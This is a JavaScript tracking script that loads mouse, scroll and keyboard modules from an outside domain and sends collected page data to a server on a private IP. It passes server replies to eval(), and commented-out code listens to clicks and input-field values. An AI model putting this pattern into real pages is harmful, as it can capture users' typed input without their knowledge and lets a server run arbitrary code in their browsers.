if (typeof (qzl_js_handle_flag) == "undefined") {
    qzl_js_handle_flag = true;

    //-------------config-----------------
    var url = 'http://192.168.1.104:19002/';//提交地址
    var component = ['mouse','scroll','keybord','other']; //组件枚举
    var ajax_switch = true;  //提交开关
    //-------------config-----------------

    //-------------init 加载依赖-------------------
    function init(){
      //加载事件
      component.forEach(function(vo){
        var new_element = document.createElement("script");
          new_element.setAttribute("type", "text/javascript");
          new_element.setAttribute("src", '//v.qzl8.com/https/'+vo+".js");
          document.body.appendChild(new_element);
      })
    }
    //-------------init-------------------

    //监听keybord
    //公共方法
    function ajaxGet(is_close,info,callback){
      console.log(info);
      if(ajax_switch){
        var ajax = new XMLHttpRequest();
        if(is_close == 1){
          ajax.open('get',url+'webDataEnd');
        }
        else{
          ajax.open('get',url+'webData?data='+info);
        }
        ajax.send();
        ajax.onreadystatechange = function () {
           if (ajax.readyState==4 &&ajax.status==200) {
              if(typeof(callback) != 'undefined'){
                eval(callback+'('+ajax.responseText+')');
              }
           } 
        }
      }
    }

    
    //阻止冒泡
    function stopPropagation(){
      var e = window.event || event;
      if (e.stopPropagation) {
          e.stopPropagation();
      } else {
          e.cancelBubble = true;
      }
    }

    init();
}



// //监听click事件
//   function addEvent(){
//     var tags = document.getElementsByTagName('*');
//     for (var i = 0; i < tags.length; i++) {
//       tags[i].addEventListener('click', watchClick, false);
//     }
//   }
//   function watchClick() {
//   	console.log(this);
//   	var e = window.event || event;
//     if (e.stopPropagation) {
//         e.stopPropagation();
//     } else {
//         e.cancelBubble = true;
//     }
//   }

// //监听键盘事件
//   function addInputEvent(){
//     var tags = document.getElementsByTagName('input');
//     for (var i = 0; i < tags.length; i++) {
//         tags[i].addEventListener('input', showInnerHtml, false);
//       }
//   }
//   function showInnerHtml() {
//   	console.log(this.value);
//   	var e = window.event || event;
//     if (e.stopPropagation) {
//         e.stopPropagation();
//     } else {
//         e.cancelBubble = true;
//     }
//   }
  
  
//   window.onload = function(){
//   	addEvent();
//   	addInputEvent();
//   }
